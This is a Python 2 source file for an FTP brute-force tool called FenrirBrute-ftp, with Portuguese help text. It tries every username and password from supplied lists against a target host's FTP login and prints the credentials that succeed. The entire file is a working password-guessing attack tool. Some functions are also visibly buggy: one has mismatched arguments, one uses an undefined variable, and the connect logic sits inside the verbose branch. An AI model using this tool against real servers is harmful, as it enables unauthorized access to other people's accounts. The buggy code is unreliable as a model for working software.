#!/usr/bin/python
import sys
import socket
import re
import getopt


def banner():
	print """


	______              _     ______            _               __ _         
	|  ___|            (_)    | ___ \          | |             / _| |        
	| |_ ___ _ __  _ __ _ _ __| |_/ /_ __ _   _| |_ ___ ______| |_| |_ _ __  
	|  _/ _ \ '_ \| '__| | '__| ___ \ '__| | | | __/ _ \______|  _| __| '_ \ 
	| ||  __/ | | | |  | | |  | |_/ / |  | |_| | ||  __/      | | | |_| |_) |
	\_| \___|_| |_|_|  |_|_|  \____/|_|   \__,_|\__\___|      |_|  \__| .__/ 
	                                                                  |_|    

	Desenvolvido por:

	Leonardo Toledo
	https://github.com/leonardor666

	------------------------------------------------------------------------

"""

def help():
	banner()
	print """
	Modo de uso: python FenrirBrute-ftp -a host  -U userList -S passList
	Exemplo: python FenrirBrute-ftp -a 192.168.1.8  -U usuarios.txt -S senhas.txt


	OPCOES:

	-a <host>		Endereco do host alvo
	-p <porta>		Porta para ser atacada, padrao 21
	-u <user>		Usuario
	-U <user list>		Lista de usuarios
	-s <senha>		Senha
	-S <pass list>		Lista de senhas
	-h 			Exibe esta ajuda
	-v			Ativa o modo verbose e exibe todas
				as tentativas.
"""
	sys.exit()

def test(host,port):
	try:
		test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		test.connect((host,int(port)))
		testbanner = test.recv(1024)
	except socket.gaierror:
		print '\n \33[31m[-] NAO FOI POSSIVEL CONECTAR COM O HOST', host + ':' + port, "\n\33[0m"
		sys.exit()

def brute_passlist(usuario,passlist,host,port,verbose,resp,parar):
	with open(passlist) as pwl:
		for p in pwl:
			p = p.strip()
			saida = "[-] Tentando %s:%s"%(usuario,p)
			if verbose == 1:
				print '	'+saida.strip()
			ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			ftp.connect((host,int(port)))
			ftp.recv(1024)
			ftp.send('USER '+usuario+'\r\n')
			ftp.recv(1024)
			ftp.send('PASS '+p+'\r\n')
			ftpbanner = ftp.recv(1024)
			if re.search('230',ftpbanner):
				if parar == 1:
					print '\n	SENHA ENCONTRADA:\n'
					print "	[\33[92m+\33[0m] [\33[92m%s\33[0m].................[\33[92m%s\33[0m:\33[92m%s\33[0m]"%(host,usuario,p)
					sys.exit()
				enc = "	[\33[92m+\33[0m] [\33[92m%s\33[0m].................[\33[92m%s\33[0m:\33[92m%s\33[0m]"%(host,usuario,p)
				print enc
				resp.append(enc)
			else:
				ftp.close()
	pwl.close()

def brute_pass(usuario,pw,host,port,verbose,resp):
	saida = "[-] Tentando %s:%s"%(usuario,pw)
	if verbose == 1:
		print '	'+saida.strip()
		ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		ftp.connect((host,int(port)))
		ftp.recv(1024)
		ftp.send('USER '+usuario+'\r\n')
		ftp.recv(1024)
		ftp.send('PASS '+pw+'\r\n')
		ftpbanner = ftp.recv(1024)
		if re.search('230',ftpbanner):
			if parar == 1:
				print "\n	SENHA ENCONTRADA:\n"
				print " [\33[92m+\33[0m] [\33[92m%s\33[0m].................[\33[92m%s\33[0m:\33[92m%s\33[0m]]"%(host,usuario,pw)
			enc = " [\33[92m+\33[0m] [\33[92m%s\33[0m].................[\33[92m%s\33[0m:\33[92m%s\33[0m]]"%(host,usuario,pw)
			print enc
			resp.append(enc)
			if parar == 1:
				sys.exit(2)
		else:
			ftp.close()
		ftp.close()

def resposta(resp,verbose):
	if verbose == 1:
		print "\n	------------------------------------------------------------------------"
	if len(resp) > 0:
		print '\n	SENHAS ENCONTRADAS:\n'
		for i in resp:
			print i
		print ''
		sys.exit()
	else:
		print '	NENHUMA SENHA ENCONTRADA\n'
		sys.exit()


def main(argv):
	resp = []
	if len(sys.argv) == 1:
		help()

	luser = 0
	lpass = 0
	host = ''
	port = 21
	user = ''
	pw = ''
	verbose = 0
	passlist = ''
	userlist = ''
	argumento = []
	parar = 0

	try:
        	opts, args = getopt.getopt(argv,"hva:p:u:U:s:S:")
	except getopt.GetoptError:
		help()
	for opt, arg in opts:
		argumento.append(opt)
		if opt == '-h':
			help()
		elif opt == '-v':
			verbose = 1
		elif opt == '-a':
			host = arg
		elif opt == '-p':
			port = arg
		elif opt == '-u':
			user = arg
		elif opt == '-s':
			pw = arg
		elif opt == '-S':
			passlist = arg
		elif opt == '-U':
			userlist = arg

	if '-s' in argumento and '-S' in argumento:
		banner()
		print '	\33[93mO parametro -s nao pode ser usado com -S\33[0m'
		sys.exit()
	elif '-u' in argumento and '-U' in argumento:
		banner()
		print '	\33[93mO parametro -u nao pode ser usado com -U\33[0m'
		sys.exit()

	banner()
	test(host,port)


	try:
		if userlist != '':
			with open(userlist) as dfuser:
				for u in dfuser:
					u = u.strip()
					luser += 1
			dfuser.close()
		elif user != '':
			luser = 1
	except IOError:
		print "	\33[31mParametro invalido em -U\33[0m"
		sys.exit()

	try:
		if passlist != '':
			with open(passlist) as dfpass:
				for p in dfpass:
					p = p.strip()
					lpass += 1
			dfpass.close()
		elif pw != '':
			lpass = 1
	except IOError:
		print "	\33[31mParametro invalido em -S\33[0m"
		sys.exit()

	print "\n	INICIANDO BRUTE FORCE NO HOST: "+host+":"+str(port)+"\n"


	print "	[+] Host.............................[%s]"%(host)
	print "	[+] Porta............................[%s]"%(port)
	print "	[+] Usuarios.........................[%s]"%(luser)
	print "	[+] Senhas...........................[%s]\n"%(lpass)
	print "	------------------------------------------------------------------------\n"

	if userlist != '' and passlist != '':
		with open(userlist) as usrlist:
			for u in usrlist:
				u = u.strip()
				brute_passlist(u,passlist,host,port,verbose,resp,0)
	elif user != '' and passlist != '':
		brute_passlist(user,passlist,host,port,verbose,resp,1)
	elif userlist != '' and pw != '':
		with open(userlist) as usrlist:
			for u in usrlist:
				u = u.strip()
				brute_pass(u,pw,host,port,verbose,resp,0)
	elif user != '' and pw != '':
		brute_pass(user,pw,host,port,verbose,resp,1)

	resposta(resp,verbose)


if __name__ == '__main__':
        main(sys.argv[1:])
